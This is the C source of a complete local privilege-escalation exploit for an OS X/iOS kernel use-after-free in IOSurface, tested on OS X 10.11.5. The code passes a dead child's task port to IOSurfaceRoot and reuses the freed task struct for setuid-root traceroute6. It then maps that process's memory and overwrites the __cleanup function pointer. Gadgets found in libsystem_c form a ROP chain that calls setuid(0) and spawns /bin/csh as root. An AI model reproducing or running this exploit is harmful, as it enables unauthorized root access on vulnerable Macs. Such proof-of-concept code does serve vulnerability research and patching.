// ianbeer

/*
Exploit for OS X/iOS kernel use-after-free in IOSurface

tested on OS X 10.11.5 (15F34) on MacBookAir5,2 but should kinda work on any recent mac
*/

#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <sys/mman.h>
#include <sys/stat.h>

#include <libkern/OSAtomic.h>
#include <mach/mach.h>
#include <mach/mach_error.h>
#include <mach/mach_vm.h>
#include <mach/task.h>
#include <mach/task_special_ports.h>

#include <IOKit/IOCFSerialize.h>
#include <IOKit/IOKitLib.h>
#include <CoreFoundation/CoreFoundation.h>

#define MACH_ERR(str, err) do { \
  if (err != KERN_SUCCESS) {    \
    mach_error("[-]" str "\n", err); \
    exit(EXIT_FAILURE);         \
  }                             \
} while(0)

#define FAIL(str) do { \
  printf("[-] " str "\n");  \
  exit(EXIT_FAILURE);  \
} while (0)

#define LOG(str) do { \
  printf("[+] " str"\n"); \
} while (0)

/***************
 * port dancer *
 ***************/

// set up a shared mach port pair from a child process back to its parent without using launchd
// based on the idea outlined by Robert Sesek here: https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html

// mach message for sending a port right
typedef struct {
  mach_msg_header_t header;
  mach_msg_body_t body;
  mach_msg_port_descriptor_t port;
} port_msg_send_t;

// mach message for receiving a port right
typedef struct {
  mach_msg_header_t header;
  mach_msg_body_t body;
  mach_msg_port_descriptor_t port;
  mach_msg_trailer_t trailer;
} port_msg_rcv_t;

typedef struct {
  mach_msg_header_t  header;
} simple_msg_send_t;

typedef struct {
  mach_msg_header_t  header;
  mach_msg_trailer_t trailer;
} simple_msg_rcv_t;

#define STOLEN_SPECIAL_PORT TASK_BOOTSTRAP_PORT

// a copy in the parent of the stolen special port such that it can be restored
mach_port_t saved_special_port = MACH_PORT_NULL;

// the shared port right in the parent
mach_port_t shared_port_parent = MACH_PORT_NULL;

void setup_shared_port() {
  kern_return_t err;
  // get a send right to the port we're going to overwrite so that we can both
  // restore it for ourselves and send it to our child
  err = task_get_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, &saved_special_port);
  MACH_ERR("saving original special port value", err);

  // allocate the shared port we want our child to have a send right to
  err = mach_port_allocate(mach_task_self(),
                           MACH_PORT_RIGHT_RECEIVE,
                           &shared_port_parent);

  MACH_ERR("allocating shared port", err);

  // insert the send right
  err = mach_port_insert_right(mach_task_self(),
                               shared_port_parent,
                               shared_port_parent,
                               MACH_MSG_TYPE_MAKE_SEND);
  MACH_ERR("inserting MAKE_SEND into shared port", err);

  // stash the port in the STOLEN_SPECIAL_PORT slot such that the send right survives the fork
  err = task_set_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, shared_port_parent);
  MACH_ERR("setting special port", err);
}

mach_port_t recover_shared_port_child() {
  kern_return_t err;

  // grab the shared port which our parent stashed somewhere in the special ports
  mach_port_t shared_port_child = MACH_PORT_NULL;
  err = task_get_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, &shared_port_child);
  MACH_ERR("child getting stashed port", err);

  LOG("child got stashed port");

  // say hello to our parent and send a reply port so it can send us back the special port to restore

  // allocate a reply port
  mach_port_t reply_port;
  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &reply_port);
  MACH_ERR("child allocating reply port", err);

  // send the reply port in a hello message
  simple_msg_send_t msg = {0};

  msg.header.msgh_size = sizeof(msg);
  msg.header.msgh_local_port = reply_port;
  msg.header.msgh_remote_port = shared_port_child;

  msg.header.msgh_bits = MACH_MSGH_BITS (MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);

  err = mach_msg_send(&msg.header);
  MACH_ERR("child sending task port message", err);

  LOG("child sent hello message to parent over shared port");

  // wait for a message on the reply port containing the stolen port to restore
  port_msg_rcv_t stolen_port_msg = {0};
  err = mach_msg(&stolen_port_msg.header, MACH_RCV_MSG, 0, sizeof(stolen_port_msg), reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
  MACH_ERR("child receiving stolen port\n", err);

  // extract the port right from the message
  mach_port_t stolen_port_to_restore = stolen_port_msg.port.name;
  if (stolen_port_to_restore == MACH_PORT_NULL) {
    FAIL("child received invalid stolen port to restore");
  }

  // restore the special port for the child
  err = task_set_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, stolen_port_to_restore);
  MACH_ERR("child restoring special port", err);

  LOG("child restored stolen port");
  return shared_port_child;
}

mach_port_t recover_shared_port_parent() {
  kern_return_t err;

  // restore the special port for ourselves
  err = task_set_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, saved_special_port);
  MACH_ERR("parent restoring special port", err);

  // wait for a message from the child on the shared port
  simple_msg_rcv_t msg = {0};
  err = mach_msg(&msg.header,
                 MACH_RCV_MSG,
                 0,
                 sizeof(msg),
                 shared_port_parent,
                 MACH_MSG_TIMEOUT_NONE,
                 MACH_PORT_NULL);
  MACH_ERR("parent receiving child hello message", err);

  LOG("parent received hello message from child");

  // send the special port to our child over the hello message's reply port
  port_msg_send_t special_port_msg = {0};

  special_port_msg.header.msgh_size        = sizeof(special_port_msg);
  special_port_msg.header.msgh_local_port  = MACH_PORT_NULL;
  special_port_msg.header.msgh_remote_port = msg.header.msgh_remote_port;
  special_port_msg.header.msgh_bits        = MACH_MSGH_BITS(MACH_MSGH_BITS_REMOTE(msg.header.msgh_bits), 0) | MACH_MSGH_BITS_COMPLEX;
  special_port_msg.body.msgh_descriptor_count = 1;

  special_port_msg.port.name        = saved_special_port;
  special_port_msg.port.disposition = MACH_MSG_TYPE_COPY_SEND;
  special_port_msg.port.type        = MACH_MSG_PORT_DESCRIPTOR;

  err = mach_msg_send(&special_port_msg.header);
  MACH_ERR("parent sending special port back to child", err);

  return shared_port_parent;
}

/*** end of port dancer code ***/

void do_child(mach_port_t shared_port) {
  kern_return_t err;

  // create a reply port to receive an ack that we should exec the target
  mach_port_t reply_port;
  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &reply_port);
  MACH_ERR("child allocating reply port", err);

  // send our task port to our parent over the shared port
  port_msg_send_t msg = {0};

  msg.header.msgh_size = sizeof(msg);
  msg.header.msgh_local_port = reply_port;
  msg.header.msgh_remote_port = shared_port;
  msg.header.msgh_bits = MACH_MSGH_BITS (MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE) | MACH_MSGH_BITS_COMPLEX;

  msg.body.msgh_descriptor_count = 1;

  msg.port.name = mach_task_self();
  msg.port.disposition = MACH_MSG_TYPE_COPY_SEND;
  msg.port.type = MACH_MSG_PORT_DESCRIPTOR;

  err = mach_msg_send(&msg.header);
  MACH_ERR("child sending task port message", err);

  LOG("child sent task port back to parent");

  // spin and let our parent kill us
  while(1){;}
}

mach_port_t do_parent(mach_port_t shared_port) {
  kern_return_t err;

  // wait for our child to send us its task port
  port_msg_rcv_t msg = {0};
  err = mach_msg(&msg.header,
                 MACH_RCV_MSG,
                 0,
                 sizeof(msg),
                 shared_port,
                 MACH_MSG_TIMEOUT_NONE,
                 MACH_PORT_NULL);
  MACH_ERR("parent receiving child task port message", err);

  mach_port_t child_task_port = msg.port.name;
  if (child_task_port == MACH_PORT_NULL) {
    FAIL("invalid child task port");
  }

  LOG("parent received child's task port");

  return child_task_port;
}

io_connect_t get_uc(mach_port_t task_port) {
  kern_return_t err;
  mach_port_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));

  if (service == MACH_PORT_NULL) {
    printf("unable to get service\n");
    return MACH_PORT_NULL;
  }

  io_connect_t conn = MACH_PORT_NULL;

  err = IOServiceOpen(service, task_port, 0, &conn);
  if (err != KERN_SUCCESS){
    printf("IOServiceOpen failed: %s\n", mach_error_string(err));
    conn = MACH_PORT_NULL;
  }
  IOObjectRelease(service);

  return conn;   
}

// fork and exec the binary child target
// setting its stdout/stderr to the write end of a full pipe
//
// return the read end in blocker allowing the child to
// be blocked on write operations as long as it doesn't
// fcntl O_NONBLOCK stdout/stderr

// based on the PoC here: https://dividead.wordpress.com/2009/07/21/blocking-between-execution-and-main/
int fork_and_exec_blocking(char* target, char** argv, char** envp, int* pid) {
  // save the old stdout/stderr fd's
  int saved_stdout = dup(1);
  int saved_stderr = dup(2);

  // create the pipe
  int pipefds[2];
  pipe(pipefds);

  int read_end = pipefds[0];
  int write_end = pipefds[1];

  // make the pipe nonblocking so we can fill it
  int flags = fcntl(write_end, F_GETFL);
  flags |= O_NONBLOCK;
  fcntl(write_end, F_SETFL, flags);

  // fill up the write end
  int ret, count = 0;
  do {
    char ch = ' ';
    ret = write(write_end, &ch, 1);
    count++;
  } while (!(ret == -1 && errno == EAGAIN));
  printf("wrote %d bytes to pipe buffer\n", count-1);


  // make it blocking again
  flags = fcntl(write_end, F_GETFL);
  flags &= ~O_NONBLOCK;
  fcntl(write_end, F_SETFL, flags);

  // set the pipe write end to stdout/stderr
  dup2(write_end, 1);
  dup2(write_end, 2);

  int child_pid = fork();

  if (child_pid == 0) {
    // exec the target, writes to stdout/stderr will block until
    // the parent reads from blocker
    //execl(target, target, NULL); // noreturn
    execve(target, argv, envp);
  }

  // restore parents stdout/stderr
  dup2(saved_stdout, 1);
  dup2(saved_stderr, 2);

  close(saved_stdout);
  close(saved_stderr);

  close(write_end);

  if (pid) {
    *pid = child_pid;
  }
  return read_end;
}

int fork_and_exec(const char* path, char** argv, char** envp) {
  pid_t child_pid = fork();

  if (child_pid == -1) {
    FAIL("forking");
  }

  if (child_pid == 0) {
    execve(path, argv, envp);
  }

  return child_pid;
}

/*
setup the ROP payload and stuff

Since we can block the process on writes we'll pass an invalid -w option to traceroute6
which leads to this code:

  fprintf(stderr, "traceroute6: invalid wait time.\n");
  exit(1);

The process will block on the write and importantly that happens before traceroute6 tries (incorrectly...)
to drop privs so we still have euid 0.

While the process is waiting here we can use the bug to get an IOSurface which wraps
the page of the target's libsystem_c.dylib:__DATA segment which contains the __cleanup pointer.
If __cleanup is non-null it will be called by exit().

There's no need to try to pivot the stack anywhere; since we exec'd this program we can put a large amount of
data on the stack so we just need to point __cleanup to a gadget which does a large add rsp, X;...;ret

This function returns an argv array containing the ROP stack as well as the addresses the rest of the
exploit needs to find __cleanup;
*/

// how many null bytes in this uint64?
int count_nulls(uint64_t val) {
  int nulls = 0;
  uint8_t* bytes = (uint8_t*)&val;
  for (int i = 0; i < 8; i++){
    if (bytes[i] == 0) {
      nulls++;
    }
  }
  return nulls;
}

// we use this to get code execution
// when the target calls exit it will call this function pointer
// libsystem_c.dylib exports it so we can just get the loader to resolve it for us
extern void** __cleanup;

char** setup_payload_and_offsets(uint64_t* stack_shift, uint64_t* fptr_page, uint32_t* fptr_offset) {
  *fptr_page = (uint64_t)((unsigned long long)(&__cleanup) & ~(0xfffULL));
  *fptr_offset = ((uint64_t)(&__cleanup)) - *fptr_page;

  // ret slide gadget with no NULL bytes other than the top two as we'll need many copies
  uint8_t* ret = (uint8_t*)&strcpy; // the start of libsystem_c
  do {
    ret += 1;
    ret = memmem(ret, 0x1000000, "\xc3", 1);
  } while (ret != NULL && ((count_nulls((uint64_t)ret)) != 2) );

  if (ret == NULL) {
    FAIL("couldn't find suitable ret gadget\n");
  }

  // pop rdi ret gadget
  uint8_t* pop_rdi_ret = memmem(&strcpy, 0x1000000, "\x5f\xc3", 2);
  if (pop_rdi_ret == NULL) {
    FAIL("couldn't find pop rdi; ret gadget\n");
  }

  // /bin/sh string:
  void* bin_sh = ((char*)__cleanup)-(1024*1024); // start from 1MB below this symbol in libsystem_c.dylib
  bin_sh = memmem(bin_sh, 2*1024*1024, "/bin/csh", 9);
  if (bin_sh == NULL) {
    printf("couldn't find /bin/sh string\n");
    return NULL;
  }

  // realpath has a massive stack frame, should be large enough:
  // find the add rsp, X at the end of it:
  uint8_t* stack_shift_gadget = memmem(&realpath, 0x4000, "\x48\x81\xc4", 3); 
  if (stack_shift == NULL) {
    printf("couldn't find stack shift\n");
    return NULL;
  }

  // approximately how far up the stack will that push us?
  uint32_t realpath_shift_amount = *(uint32_t*)(stack_shift_gadget+3);

  // approximately how big is traceroute6's stack frame?
  uint32_t traceroute6_stack_size = 0x948;

  if (realpath_shift_amount - 0x200 < traceroute6_stack_size) {
    printf("that stack shift gadget probably isn't big enough...\n");
    return NULL;
  }

  *stack_shift = (uint64_t)stack_shift_gadget;

/*

try to work out a good estimate for the number of ret-slide gadgets we need:

                    |                              |
                    |                              |
                    |                              |
                    +------------------------------+
                    |                              |
              +++   |   argv values                |
realpath stack |    |                              |
size           |    +------------------------------+
               |    |                              |
               |    |   argv ptrs                  |
               |    |                              |
               |    +------------------------------+
               |    |                              |     assume argv
               |    |   argv ptrs                  |    +starts here
               |    |                              |    |
               |    +------------------------------+ <---+
               |    |                              |    |  _start stack
               |    |                              |    |  size
               |    |   _start stack frame         |    |
               |    |                              |    |
               |    |                              |    |
               |    |                              |    |
              +++   +------------------------------+   +++

((realpath_stack_size - _start_stack_size) / 8 / 5) * 2

we want the add rsp, realpath_stack_size to end up somewhere near the middle of the argv values
which we can fill with ret-slide gadgets followed by the short real rop stack

since the ret-slide gadgets will contain two NULL bytes we need two argv pointers per ret-slide gadget

if we assume that argv is right above _start's stack frame then we want the difference between
realpath_stack_size and _start_stack_size to be 5/6'ths of the argv ptrs and values area

realpath stack size should be sufficiently big that this will work across multiple versions
*/
  int ret_slide_length = ((realpath_shift_amount - traceroute6_stack_size) / 8 / 5) * 2;

/*
  since we can only pass pointers to NULL terminated strings to execve we
  have to do a bit of fiddling to set up the right argv array for the ROP stack
*/

  char* progname = "/usr/sbi" //8
                   "n/tracer" //8
                   "oute6";   //6
  char* optname  = "-w";      //3
  char* optval   = "LOLLLL";  //7

  size_t target_argv_rop_size = (ret_slide_length + 6)* 8; // ret slides plus slots for the actual rop

  uint8_t** args_u64 = malloc(target_argv_rop_size + 1); // plus extra NULL byte at the end
  char* args = (char*)args_u64;
  memset(args, 0, target_argv_rop_size + 1);

  // ret-slide
  int i;
  for (i = 0; i < ret_slide_length; i++) {
    args_u64[i] = ret;
  }

  args_u64[i] = pop_rdi_ret;
  args_u64[i+1] = 0;
  args_u64[i+2] = (uint8_t*)&setuid;
  args_u64[i+3] = pop_rdi_ret;
  args_u64[i+4] = bin_sh;
  args_u64[i+5] = (uint8_t*)&system;

  // allocate worst-case size
  
  size_t argv_allocation_size = (ret_slide_length+100)*8*8;
  char** target_argv = malloc(argv_allocation_size);
  memset(target_argv, 0, argv_allocation_size);
  target_argv[0] = progname;
  target_argv[1] = optname;
  target_argv[2] = optval;
  int argn = 3;
  target_argv[argn++] = &args[0];
  for(int i = 1; i < target_argv_rop_size; i++) {
    if (args[i-1] == 0) {
      target_argv[argn++] = &args[i];
    }
  }
  target_argv[argn] = NULL;

  return target_argv;
}
void unblock_pipe_and_interact(int fd) {
  char buf[1024];
  
  int flags = fcntl(fd, F_GETFL);
  flags &= ~O_NONBLOCK;
  fcntl(fd, F_SETFL, flags);

  ssize_t ret;
  do {
    ret = read(fd, buf, 1);
    if (ret > 0){
      write(1, buf, ret);
    }
  } while (ret > 0);
}

void sploit(int child_pid, mach_port_t child_task_port) {
  kern_return_t err;

  // setup ROP stack we'll use in the target:
  uint64_t fptr_page = 0;
  uint32_t fptr_offset = 0;
  uint64_t stack_shift_gadget = 0;
  char** argv = setup_payload_and_offsets(&stack_shift_gadget, &fptr_page, &fptr_offset);

  // get the userclient passing the child's task port
  io_connect_t dangler = get_uc(child_task_port);

  printf("got dangler\n");

  // drop our ref on the child_task_port
  mach_port_deallocate(mach_task_self(), child_task_port);

  // kill the child, free'ing its task struct
  kill(child_pid, 9);
  int status;
  wait(&status);
  

  // fork and exec the target who's memory we want to mess with
  //int targets_count = 1;
  //int* target_pids = exec_n("./mmapper", targets_count);
  int target_pid = 0;
  int blocker = fork_and_exec_blocking("/usr/sbin/traceroute6", argv, NULL, &target_pid);

  // wait a little bit to make sure it's actually started...
  // (could peek in the pipe and see if it's written anything there?)
  usleep(100000);

  printf("killed child and exec'ed target\n");

  // now the dangler userclient's task struct* hopefully actually points to the task struct
  // of one of those targets

  // now we create a new surface, the IOSurface code will use that task struct* and actually
  // create an IOMemoryDescriptor wrapping the targets memory, not ours

  CFMutableDictionaryRef surface_props = CFDictionaryCreateMutable(kCFAllocatorDefault,
                                                                   0,
                                                                   &kCFTypeDictionaryKeyCallBacks,
                                                                   &kCFTypeDictionaryValueCallBacks);

  uint64_t target_addr = fptr_page;
  uint32_t target_size = 0x1000;

  CFDictionarySetValue(surface_props, CFSTR("IOSurfaceAddress"), CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &target_addr));
  CFDictionarySetValue(surface_props, CFSTR("IOSurfaceAllocSize"), CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &target_size));
  CFDictionarySetValue(surface_props, CFSTR("IOSurfaceIsGlobal"), kCFBooleanTrue);
  
  CFDataRef props_data = IOCFSerialize(surface_props, kNilOptions);
  void* inputStruct = (void*)CFDataGetBytePtr(props_data);
  size_t inputStructCnt = (size_t)CFDataGetLength(props_data);

  uint64_t inputScalar[16];
  size_t inputScalarCnt = 0;

  uint64_t outputScalar[16];
  uint32_t outputScalarCnt = 0;

  char outputStruct[0x548];
  size_t outputStructCnt = 0x548;

  // create_surface
  int selector = 0;

  err = IOConnectCallMethod(
          dangler,
          selector,
          inputScalar,
          inputScalarCnt,
          inputStruct,
          inputStructCnt,
          outputScalar,
          &outputScalarCnt,
          outputStruct,
          &outputStructCnt);

  MACH_ERR("making external method call", err);
  
  int target_surface_id = *(int*)(&outputStruct[0x10]);

  printf("got a surface id: %d - hopefully that wraps a page in the target process\n", target_surface_id);

  // create another IOSurfaceRootUserClient but this time with our own task port
  io_connect_t surface = get_uc(mach_task_self());

  // call lookup_surface which will lookup the global surface by id and map it into this task:

  inputStruct = NULL;
  inputStructCnt = 0;

  inputScalar[0] = target_surface_id;
  inputScalarCnt = 1;

  outputStructCnt = 0x548;

  // lookup_surface
  selector = 6;

  err = IOConnectCallMethod(
          surface,
          selector,
          inputScalar,
          inputScalarCnt,
          inputStruct,
          inputStructCnt,
          outputScalar,
          &outputScalarCnt,
          outputStruct,
          &outputStructCnt);

  MACH_ERR("making external method call", err);
  
  char* shared_page = *(char**)(&outputStruct[0]);
  printf("got a surface back, mapped in at %p\n", shared_page);

  printf("%c%c%c%c\n", shared_page[0], shared_page[1], shared_page[2], shared_page[3]);
  shared_page[0] = 'B';

  //overwrite the fptr value:
  *(uint64_t*)(shared_page+fptr_offset) = stack_shift_gadget;

  // unblock the pipe and let the target run to exit
  unblock_pipe_and_interact(blocker);

  int sl;
  wait(&sl);
}

int main(int argc, char** argv) {
  setup_shared_port();

  pid_t child_pid = fork();
  if (child_pid == -1) {
    FAIL("forking");
  }

  if (child_pid == 0) {
    mach_port_t shared_port_child = recover_shared_port_child();
    do_child(shared_port_child);
  } else {
    mach_port_t shared_port_parent = recover_shared_port_parent();
    mach_port_t child_task_port = do_parent(shared_port_parent);
    sploit(child_pid, child_task_port);
  }

  return 0;
}
